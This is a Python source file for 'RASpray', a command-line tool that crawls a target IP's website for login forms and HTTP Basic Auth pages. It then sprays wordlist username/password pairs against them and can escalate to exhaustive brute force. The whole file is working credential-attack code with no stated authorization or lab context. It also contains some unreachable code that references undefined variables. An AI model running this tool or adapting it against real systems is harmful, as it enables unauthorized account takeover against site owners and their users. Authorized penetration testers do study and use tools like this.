#!/usr/bin/env python3

import sys
import re
import requests
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth
from requests.exceptions import RequestException, Timeout, ConnectionError
from urllib.parse import urljoin
from colorama import Fore, Style, init
import time
import itertools

# Define the tool's name and version
TOOL_NAME = "RASpray"
VERSION = "1.0.0"

# Function to display the RASPRAY banner
def display_banner():
    banner = r"""
    
    ██████╗  █████╗     ███████╗██████╗ ██████╗  █████╗ ██╗   ██╗
    ██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
    ██████╔╝███████║    ███████╗██████╔╝██████╔╝███████║ ╚████╔╝ 
    ██╔══██╗██╔══██║    ╚════██║██╔═══╝ ██╔══██╗██╔══██║  ╚██╔╝  
    ██║  ██║██║  ██║    ███████║██║     ██║  ██║██║  ██║   ██║   
    ╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                                             
    Version: 1.0.0
    """
    print(f"{Fore.RED}{banner}{Style.RESET_ALL}")

# Function to display help message
def display_help():
    """
    Displays the help message with tool usage and options.
    """
    help_text = f"""
    {TOOL_NAME} - Password Spraying Tool (v{VERSION})
    
    Usage: {TOOL_NAME} [options]

    Options:
        -h, --help              Show this help message and exit
        -u, --users             Specify the file containing usernames
        -p, --pass              Specify the file containing passwords
        -i, --ip                Specify the target IP address
        --version               Show the tool version and exit
        --min-len               Specify the minimum length of usernames or passwords
        --max-len               Specify the maximum length of usernames or passwords
        --uppercase             Require at least 1 uppercase letter
        --lowercase             Require at least 1 lowercase letter
        --numbers               Require at least 1 number
        --special-chars         Require at least 1 special character (e.g., !, @, #)
    """
    print(help_text)

# Function to display the version
def display_version():
    """
    Displays the current version of the tool.
    """
    print(f"{TOOL_NAME} version {VERSION}")

# Function to traverse a website and find password fields or BasicAuth requests
def traverse_website(base_url, session, max_depth=3):
    """
    Traverses the website starting from the base URL. Follows links found on each page.
    Implements a depth limit to avoid deep crawling and infinite loops.
    
    Args:
        base_url (str): The starting URL of the website.
        session (Session): The session object to maintain cookies across requests.
        max_depth (int): Maximum depth to traverse the website.

    Returns:
        list: A list of URLs found on the website.
    """
    visited = set()
    to_visit = [(base_url, 0)]  # (URL, depth)
    links = []

    while to_visit:
        url, depth = to_visit.pop(0)
        if depth > max_depth:
            continue
        
        if url in visited:
            continue
        
        visited.add(url)
        
        try:
            response = session.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')

            # Collect all links on the page
            for a in soup.find_all('a', href=True):
                full_url = urljoin(base_url, a['href'])
                
                # Only add unvisited links to the list
                if full_url not in visited:
                    links.append(full_url)
                    to_visit.append((full_url, depth + 1))

        except RequestException as e:
            print(f"Error traversing {url}: {e}")
    
    return links

def is_password_requested_basic_auth(url, session):
    """
    Checks if the given page requires HTTP Basic Authentication.

    Args:
        url (str): The URL of the page to check.
        session (Session): The session object to make requests.

    Returns:
        bool: True if the page prompts for Basic Authentication, False otherwise.
    """
    try:
        # Send a GET request to check if BasicAuth is required
        response = session.get(url, timeout=10, allow_redirects=False)

        # Check if the response is a 401 Unauthorized indicating BasicAuth is needed
        if response.status_code == 401:
            print(f"{Fore.GREEN}BasicAuth required on {url}")
            return True
        
        else:
            print(f"No BasicAuth required on {url}")
            return False
        
        failure_reason = extract_failure_reason(response.text)
        print(f"{Fore.RED}Login failed for {username} on {full_url}. Reason: {failure_reason}")
        return None

    except RequestException as e:
        print(f"Error checking {url}: {e}")
        return False
    

    
    
def is_password_requested_basic_password_field(url, session):
    """
    Checks if the given page contains an input field for a password.

    Args:
        url (str): The URL of the page to check.
        session (Session): The session object to make requests.

    Returns:
        bool: True if the page contains a password field, False otherwise.
    """
    try:
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')

        # Parse HTML to look for password fields more robustly
        password_fields = soup.find_all('input', {'type': 'password'})

        # Also check for any form that looks like a login form
        if password_fields or is_login_form_present(response.text):
            print(f"{Fore.GREEN}Password field found on {url}")
            return True
        else:
            print(f"No password field on {url}")
            return False

    except RequestException as e:
        print(f"Error checking {url}: {e}")
        return False



# Function to filter usernames or passwords based on user criteria
def filter_by_criteria(items, min_len=None, max_len=None, uppercase=False, lowercase=False, numbers=False, special_chars=False):
    """
    Filters a list of usernames or passwords based on specified criteria.

    Args:
        items (list): A list of usernames or passwords to filter.
        min_len (int): Minimum length.
        max_len (int): Maximum length.
        uppercase (bool): Require uppercase letters.
        lowercase (bool): Require lowercase letters.
        numbers (bool): Require numbers.
        special_chars (bool): Require special characters.

    Returns:
        list: A filtered list of usernames or passwords.
    """
    filtered = []
    
    for item in items:
        if min_len and len(item) < min_len:
            continue
        if max_len and len(item) > max_len:
            continue
        if uppercase and not re.search(r'[A-Z]', item):
            continue
        if lowercase and not re.search(r'[a-z]', item):
            continue
        if numbers and not re.search(r'\d', item):
            continue
        if special_chars and not re.search(r'[!@#$%^&*(),.?":{}|<>]', item):
            continue
        filtered.append(item)
    
    return filtered

# Function to extract form fields from a login page
def extract_form_fields(soup):
    """
    Extracts all the form fields from the login page's HTML soup object.
    
    Args:
        soup (BeautifulSoup): The parsed HTML content of the page.

    Returns:
        dict: A dictionary containing form field names and their corresponding values.
    """
    form_data = {}
    form = soup.find('form')

    if form is None:
        return form_data

    # Extract all input fields in the form
    for input_tag in form.find_all('input'):
        field_name = input_tag.get('name')
        field_value = input_tag.get('value', '')

        if field_name:
            form_data[field_name] = field_value

    return form_data


def attempt_login_with_form(full_url, session, username, password):
    """
    Attempts to login by submitting the form with the username and password.
    
    Args:
        full_url (str): The URL to submit the form to.
        session (Session): The session object to maintain cookies across requests.
        username (str): The username to attempt.
        password (str): The password to attempt.
    
    Returns:
        tuple or None: Returns a tuple of (username, password) if successful, otherwise None.
    """
    try:
        # Load the login page to retrieve form fields
        response = session.get(full_url)
        soup = BeautifulSoup(response.text, 'html.parser')

        # Extract the form fields and update with credentials
        form_data = extract_form_fields(soup)
        form_data['username'] = username
        form_data['password'] = password

        # Extract form action URL (relative or absolute)
        form = soup.find('form')
        action_url = form.get('action') if form else full_url
        action_url = urljoin(full_url, action_url)
        print(f"{Fore.WHITE}Submitting form to {action_url} with {username}:{password}")

        # Submit the form data via POST
        login_response = session.post(action_url, data=form_data, allow_redirects=False)

        # Check if the response indicates a redirect (302/303)
        if login_response.status_code in [302, 303]:
            print(f"{Fore.GREEN}Redirect detected after login attempt, likely successful. Redirect URL: {login_response.headers.get('Location', '')}")
            return (username, password)
        
        # Check for specific keywords indicating successful login in the response content
        if "welcome" in login_response.text.lower() or "logout" in login_response.text.lower():
            print(f"{Fore.GREEN}Login successful for {username} on {full_url}")
            return (username, password)
        
        # Print the reason why the login might have failed (snippet of the error)
        failure_reason = extract_failure_reason(login_response.text)
        print(f"{Fore.RED}Login failed for {username} on {full_url}. Reason: {failure_reason}")
        return None

    except (RequestException, Timeout, ConnectionError) as e:
        print(f"Error during login attempt on {full_url}: {e}")
        return None


# Function to ask the user if they want to attempt bruteforce
def ask_for_bruteforce():
    while True:
        user_input = input("All combinations tried. Do you want to perform bruteforce attack? (yes/no): ").lower()
        if user_input in ['yes', 'no']:
            return user_input == 'yes'
        print("Invalid input. Please type 'yes' or 'no'.")

# Function to apply common character substitutions to a string
def apply_common_substitutions(password):
    substitutions = {
        'a': '4',
        'e': '3',
        'i': '1',
        'o': '0',
        's': '$'
    }
    
    for char, replacement in substitutions.items():
        password = password.replace(char, replacement)
    
    return password

# Function to generate all possible character replacements
def generate_password_variants(password):
    substitutions = {
        'a': ['a', '4'],
        'e': ['e', '3'],
        'i': ['i', '1'],
        'o': ['o', '0'],
        's': ['s', '$']
    }

    variants = [''.join(p) for p in itertools.product(
        *[substitutions.get(char, [char]) for char in password]
    )]
    
    return variants

# Function to perform bruteforce
def perform_bruteforce(username_file, password_file, ip_address, criteria, session, pages_to_check):
    print(f"{Fore.YELLOW}Starting bruteforce attack...{Style.RESET_ALL}")
    
    # Characters to use for bruteforce passwords
    bruteforce_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"
    
    # Load the list of usernames
    with open(username_file, 'r') as user_file:
        usernames = [line.strip() for line in user_file.readlines()]
    
    # Bruteforce each password length and combination
    for length in range(criteria['min_len'], criteria['max_len'] + 1):
        for password_tuple in itertools.product(bruteforce_chars, repeat=length):
            bruteforce_password = ''.join(password_tuple)
            print(f"{Fore.WHITE}Trying bruteforce password: {bruteforce_password}{Style.RESET_ALL}")
            # Attempt login with each username and the generated bruteforce password
            for page in pages_to_check:
                full_url = urljoin(f'http://{ip_address}', page)
                
                if is_password_requested_basic_password_field(full_url, session):
                    for username in usernames:
                        credentials = attempt_login_with_form(full_url, session, username, bruteforce_password)
                        if credentials:
                            print(f"{Fore.GREEN}Success! Username: {credentials[0]}, Password: {credentials[1]} on {full_url}")
                            return  # Stop after the first successful bruteforce

# Modify the password_spraying function to include bruteforce and character substitution
def password_spraying(ip_address, username_file, password_file, criteria):
    time.sleep(2)
    successful_cracks = []
    failed_cracks = []

    # Open the username and password files
    with open(username_file, 'r') as user_file:
        usernames = [line.strip() for line in user_file.readlines()]

    with open(password_file, 'r') as pass_file:
        passwords = [line.strip() for line in pass_file.readlines()]

    # Filter usernames and passwords by the specified criteria
    usernames = filter_by_criteria(usernames, **criteria)
    passwords = filter_by_criteria(passwords, **criteria)

    # Create a session to persist cookies across requests
    session = requests.Session()

    # Traverse through the website and find pages with password fields or BasicAuth
    base_url = f'http://{ip_address}'
    pages_to_check = traverse_website(base_url, session)

    for page in pages_to_check:
        time.sleep(2)
        full_url = urljoin(base_url, page)

        # Check if the page has a password field (form-based authentication)
        if is_password_requested_basic_password_field(full_url, session):
            for password in passwords:
                for username in usernames:
                    time.sleep(2)
                    try:
                        print(f"{Fore.WHITE}Trying username: {username} and password: {password}")
                        credentials = attempt_login_with_form(full_url, session, username, password)

                        if credentials:
                            print(f"{Fore.GREEN}Success! Username: {credentials[0]}, Password: {credentials[1]} on {full_url}")
                            successful_cracks.append((full_url, credentials[0], credentials[1]))
                        else:
                            failed_cracks.append((full_url, username, password))
                        time.sleep(10)
                    except (Timeout, ConnectionError):
                        print(f"Connection failed for {full_url}")
                    except RequestException as e:
                        print(f"An error occurred: {e}")

        if is_password_requested_basic_auth(full_url, session):
            for password in passwords:
                for username in usernames:
                    try:
                        print(f"{Fore.WHITE}Trying BasicAuth with username: {username} and password: {password}")
                        response = session.get(full_url, auth=HTTPBasicAuth(username, password))

                        if response.status_code == 200:
                            print(f"{Fore.GREEN}Success! BasicAuth credentials: Username: {username}, Password: {password} on {full_url}")
                            successful_cracks.append((full_url, username, password))
                        else:
                            print(f"{Fore.RED}Failed! Failed BasicAuth with credentials: Username: {username}, Password: {password} on {full_url}")
                            failed_cracks.append((full_url, username, password))
                        time.sleep(10)
                    except (Timeout, ConnectionError):
                        print(f"Connection failed for {full_url}")
                    except RequestException as e:
                        print(f"An error occurred: {e}")

    # After exhausting all combinations, ask if the user wants to proceed with bruteforce
    if ask_for_bruteforce():
        perform_bruteforce(username_file, password_file, ip_address, criteria, session, pages_to_check)
    
    print("\n--- Summary of Cracking Attempts ---")
    if successful_cracks:
        print(f"{Fore.GREEN}Successfully cracked pages:")
        for page, user, pwd in successful_cracks:
            print(f"{Fore.WHITE}Page: {page}, Username: {user}, Password: {pwd}")
    else:
        print(f"{Fore.RED}No successful cracking attempts.")
    
    if failed_cracks:
        print(f"{Fore.RED}Failed pages that required a password:")
        for page, user, pwd in failed_cracks:
            print(f"{Fore.WHITE}Page: {page}, Username: {user}, Password: {pwd}")
    else:
        print(f"{Fore.GREEN}No failed password cracking attempts.")





# Helper function to check if the response contains a login form
def is_login_form_present(html_content):
    """
    Checks if the provided HTML content contains a login form (i.e., username and password fields).
    
    Args:
        html_content (str): The HTML content to check.

    Returns:
        bool: True if a login form is present, False otherwise.
    """
    soup = BeautifulSoup(html_content, 'html.parser')
    username_field = soup.find('input', {'name': 'username'})
    password_field = soup.find('input', {'name': 'password'})
    
    # If both username and password fields are found, it's likely a login form
    return username_field is not None and password_field is not None

def extract_failure_reason(html_content):
    """
    Extracts potential failure reasons from the login response content.
    
    Args:
        html_content (str): The HTML content to parse.

    Returns:
        str: A snippet of the content indicating the reason for the login failure.
    """
    soup = BeautifulSoup(html_content, 'html.parser')
    
    # Look for common elements that might contain error messages
    error_messages = soup.find_all(['div', 'span', 'p', 'li'], class_=re.compile(r'error|alert|warning|message', re.I))
    error_texts = [msg.get_text(strip=True) for msg in error_messages if msg.get_text(strip=True)]
    
    # If no specific error messages are found, provide a fallback snippet from the page
    if not error_texts:
        return soup.get_text(strip=True)[:600]  # Return the first 600 characters of the page content as a fallback
    
    # Join the extracted error messages into a single string
    return ' | '.join(error_texts)



# Main function
def main():
    """
    The main function that parses command-line arguments and initiates the password spraying process.
    """
    # Display the banner
    display_banner()

    # Check if the user requested help or version
    if len(sys.argv) > 1:
        if sys.argv[1] in ['-h', '--help']:
            display_help()
            sys.exit(0)
        elif sys.argv[1] == '--version':
            display_version()
            sys.exit(0)
    
    # Check if the required arguments are provided
    if '-u' not in sys.argv or '-p' not in sys.argv or '-i' not in sys.argv:
        print("Missing required arguments! Use --help for usage instructions.")
        sys.exit(1)
    
    # Parse user-specified criteria
    criteria = {
        'min_len': int(sys.argv[sys.argv.index('--min-len') + 1]) if '--min-len' in sys.argv else None,
        'max_len': int(sys.argv[sys.argv.index('--max-len') + 1]) if '--max-len' in sys.argv else None,
        'uppercase': '--uppercase' in sys.argv,
        'lowercase': '--lowercase' in sys.argv,
        'numbers': '--numbers' in sys.argv,
        'special_chars': '--special-chars' in sys.argv
    }

    # Get the values of the provided arguments
    try:
        ip_address = sys.argv[sys.argv.index('-i') + 1]
        username_file = sys.argv[sys.argv.index('-u') + 1]
        password_file = sys.argv[sys.argv.index('-p') + 1]
    except (ValueError, IndexError):
        print("Invalid arguments! Use --help for usage instructions.")
        sys.exit(1)
    
    # Call the password spraying function
    password_spraying(ip_address, username_file, password_file, criteria)

if __name__ == '__main__':
    main()
